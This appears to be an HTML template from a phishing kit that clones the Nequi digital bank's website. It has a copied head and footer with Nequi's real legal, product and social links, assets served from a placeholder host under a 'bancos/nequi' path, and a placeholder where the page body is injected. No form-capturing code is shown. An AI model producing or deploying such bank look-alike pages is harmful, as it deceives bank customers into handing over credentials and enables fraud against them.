
<head>
    <meta http-equiv="origin-trial" content="Az520Inasey3TAyqLyojQa8MnmCALSEU29yQFW8dePZ7xQTvSt73pHazLFTK5f7SyLUJSo2uKLesEtEa9aUYcgMAAACPeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZyIsImV4cGlyeSI6MTcyNTQwNzk5OSwiaXNTdWJkb21haW4iOnRydWUsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=">
    <meta charset="utf-8">
    <title>Nequi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="Webflow">
    <meta http-equiv="cache-control" content="max-age=0">
    <meta http-equiv="cache-control" content="no-cache">
    <meta http-equiv="expires" content="0">
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
    <meta http-equiv="pragma" content="no-cache">
    <link rel="stylesheet" type="text/css" href="${my_hosting}/bancos/nequi/assets/css/normalize.css">
    <link rel="stylesheet" type="text/css" href="${my_hosting}/bancos/nequi/assets/css/nequi_two.webflow.css">
    <link rel="stylesheet" type="text/css" href="${my_hosting}/bancos/nequi/assets/css/nequi_one.webflow.css">
    <!-- <link rel="stylesheet" type="text/css" href="${my_hosting}/bancos/nequi/assets/css/main.css"> -->
    <link rel="shortcut icon" type="image/x-icon" href="${my_hosting}/bancos/nequi/assets/images/favicon.ico">

    <!-- Librerias JS -->
    <script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/V6_85qpc2Xf2sbe3xTnRte7m/recaptcha__es.js" crossorigin="anonymous" integrity="sha384-ZPaI072vP0gsA/pNxRo6gojspSWdB/IM16H4YvupewfoUcrNdXOlTpE4sbFU5WCd"></script>
    <script src="//ajax.googleapis.com/ajax/libs/angularjs/1.4.0-beta.2/angular.min.js"></script>
    <script src="https://code.angularjs.org/1.4.3/i18n/angular-locale_en-us.js"></script>
    <script src="js/libs/lodash.min.js"></script>
    <script src="js/libs/restangular.min.js"></script>
    <script type="text/javascript" src="js/libs/angular-recaptcha.min.js"></script>
</head>
<div class="_main_container">
    ${nequi_body}
</div>
<div ng-include="getTemplate('/footer.html')" class="ng-scope">
            <footer class="ng-scope">
                <div class="container-footer"> <!-- ngIf: !hidePa -->
                    <div ng-if="!hidePa" class="logo-vigilado ng-scope"></div><!-- end ngIf: !hidePa -->
                    <div class="container-top">
                        <div class="logo-nequi"> <img alt="logo nequi"
                                src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50b03c9fda96db04be382_logo-nequi-blanco.svg">
                        </div>
                        <div class="stores"> <a
                                href="https://play.google.com/store/apps/details?id=com.nequi.MobileApp&amp;hl=es"> <img
                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed88b7bb33f2c2c4653_store-googleplay.svg">
                            </a> <a href="https://apps.apple.com/co/app/nequi/id1075378688"> <img
                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed702047ba456edd2cb_store-apple.svg">
                            </a> <a
                                href="https://appgallery.huawei.com/#/app/C101700131?channelId=browser&amp;detailType=0">
                                <img
                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed702047ba456edd25c_store-huawei.svg">
                            </a> </div>
                        <div class="group-bancolombia"> <a href="https://www.grupobancolombia.com/"> <img
                                    class="img-group-bancolombia"
                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50f4c6011eb184c8d7d99_logo-grupo-bancolombia.svg">
                            </a> </div>
                    </div>
                    <hr class="separator">
                    <div class="container-middle"> <!-- ngRepeat: item in configCountry.labels -->
                        <div class="col ng-scope" ng-repeat="item in configCountry.labels"> <input type="checkbox"
                                id="info-legal" class="hide"> <label for="info-legal" class="ng-binding"> Información
                                legal <img class="ic-accordion hide"
                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e573948290d271c9185df0_ic-arrow.svg">
                            </label>
                            <div class="content-accordion"> <!-- ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data"
                                    href="https://www.nequi.com.co/legal-web/condiciones-de-uso-de-la-pagina-web"
                                    class="ng-binding ng-scope">Condiciones de
                                    uso</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data"
                                    href="https://www.nequi.com.co/legal-web/tratamiento-de-datos-personales-nequi"
                                    class="ng-binding ng-scope">Tratamiento de Datos
                                    Personales</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data"
                                    href="https://www.nequi.com.co/informacion-legal#consumidor-financiero"
                                    class="ng-binding ng-scope">Consumidor
                                    fianciero</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data"
                                    href="https://www.nequi.com.co/informacion-legal/defensor-del-consumidor-financiero-de-nequi"
                                    class="ng-binding ng-scope">Defensor del Consumidor
                                    Financiero</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data"
                                    href="https://www.nequi.com.co/legal-tarjeta-nequi/terminos-y-condiciones-de-tarjeta-nequi"
                                    class="ng-binding ng-scope">Términos y condiciones Tarjeta
                                    Nequi</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/informacion-legal"
                                    class="ng-binding ng-scope">Legal
                                    Nequi</a><!-- end ngRepeat: dataLink in item.data --> </div>
                        </div><!-- end ngRepeat: item in configCountry.labels -->
                        <div class="col ng-scope" ng-repeat="item in configCountry.labels"> <input type="checkbox"
                                id="para-personas" class="hide"> <label for="para-personas" class="ng-binding"> Para
                                personas <img class="ic-accordion hide"
                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e573948290d271c9185df0_ic-arrow.svg">
                            </label>
                            <div class="content-accordion"> <!-- ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/tarjeta-nequi"
                                    class="ng-binding ng-scope">Tarjeta
                                    Nequi</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data"
                                    href="https://www.nequi.com.co/prestamo-salvavidas"
                                    class="ng-binding ng-scope">Préstamo
                                    Salvavidas</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/prestamo-propulsor"
                                    class="ng-binding ng-scope">Préstamo
                                    Propulsor</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/usa-tu-plata"
                                    class="ng-binding ng-scope">Usa tu
                                    plata</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/paypal"
                                    class="ng-binding ng-scope">Paypal</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/remesas"
                                    class="ng-binding ng-scope">Remesas</a><!-- end ngRepeat: dataLink in item.data -->
                            </div>
                        </div><!-- end ngRepeat: item in configCountry.labels -->
                        <div class="col ng-scope" ng-repeat="item in configCountry.labels"> <input type="checkbox"
                                id="para-negocio" class="hide"> <label for="para-negocio" class="ng-binding"> Para tu
                                negocio <img class="ic-accordion hide"
                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e573948290d271c9185df0_ic-arrow.svg">
                            </label>
                            <div class="content-accordion"> <!-- ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://negocios.nequi.co/"
                                    class="ng-binding ng-scope">Negocios</a><!-- end ngRepeat: dataLink in item.data -->
                            </div>
                        </div><!-- end ngRepeat: item in configCountry.labels -->
                        <div class="col ng-scope" ng-repeat="item in configCountry.labels"> <input type="checkbox"
                                id="ayuda" class="hide"> <label for="ayuda" class="ng-binding"> Ayuda <img
                                    class="ic-accordion hide"
                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e573948290d271c9185df0_ic-arrow.svg">
                            </label>
                            <div class="content-accordion"> <!-- ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://ayuda.nequi.com.co/hc/es"
                                    class="ng-binding ng-scope">Centro de
                                    ayuda</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/blog"
                                    class="ng-binding ng-scope">Blog metidas de
                                    plata</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://comunidad.nequi.co/"
                                    class="ng-binding ng-scope">Comunidad
                                    Nequi</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data"
                                    href="https://www.nequi.com.co/roberto-hurtado-tips-de-seguridad"
                                    class="ng-binding ng-scope">Tips de
                                    seguridad</a><!-- end ngRepeat: dataLink in item.data --> </div>
                        </div><!-- end ngRepeat: item in configCountry.labels -->
                        <div class="col ng-scope" ng-repeat="item in configCountry.labels"> <input type="checkbox"
                                id="conocenos" class="hide"> <label for="conocenos" class="ng-binding"> Conócenos <img
                                    class="ic-accordion hide"
                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e573948290d271c9185df0_ic-arrow.svg">
                            </label>
                            <div class="content-accordion"> <!-- ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/somos-nequi"
                                    class="ng-binding ng-scope">¿Quiénes
                                    somos?</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data"
                                    href="https://www.nequi.com.co/nequi-trabaja-con-nosotros"
                                    class="ng-binding ng-scope">Trabaja con
                                    nosotros</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/sala-de-prensa"
                                    class="ng-binding ng-scope">Sala de
                                    prensa</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/comunicados"
                                    class="ng-binding ng-scope">Comunicados</a><!-- end ngRepeat: dataLink in item.data -->
                            </div>
                        </div><!-- end ngRepeat: item in configCountry.labels -->
                    </div>
                    <hr class="separator">
                    <div class="container-end"> <!-- ngRepeat: item in configCountry.socialMedia --><a
                            ng-repeat="item in configCountry.socialMedia" href="https://twitter.com/Nequi"
                            class="ng-scope"> <img
                                src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e5220142aa063fa007c444_ic-twitter.svg">
                        </a><!-- end ngRepeat: item in configCountry.socialMedia --><a
                            ng-repeat="item in configCountry.socialMedia" href="https://www.instagram.com/nequi_/"
                            class="ng-scope"> <img
                                src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e52201416719efe915e448_ic-instagram.svg">
                        </a><!-- end ngRepeat: item in configCountry.socialMedia --><a
                            ng-repeat="item in configCountry.socialMedia" href="https://www.facebook.com/appnequi/"
                            class="ng-scope"> <img
                                src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e52201c1a7bf3e9e5bd566_ic-facebook.svg">
                        </a><!-- end ngRepeat: item in configCountry.socialMedia --><a
                            ng-repeat="item in configCountry.socialMedia"
                            href="https://www.linkedin.com/company/nequi/mycompany/" class="ng-scope"> <img
                                src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e522013be191fdc4a0252e_ic-linkedin.svg">
                        </a><!-- end ngRepeat: item in configCountry.socialMedia --><a
                            ng-repeat="item in configCountry.socialMedia"
                            href="https://www.youtube.com/channel/UCK1dLH3nTK-GOlgSVa95XNg/feed" class="ng-scope"> <img
                                src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e52201c663d0190bc59ba8_ic-youtube.svg">
                        </a><!-- end ngRepeat: item in configCountry.socialMedia --> </div>
                    <hr class="separator hide show-mobile">
                </div>
            </footer>
</div>

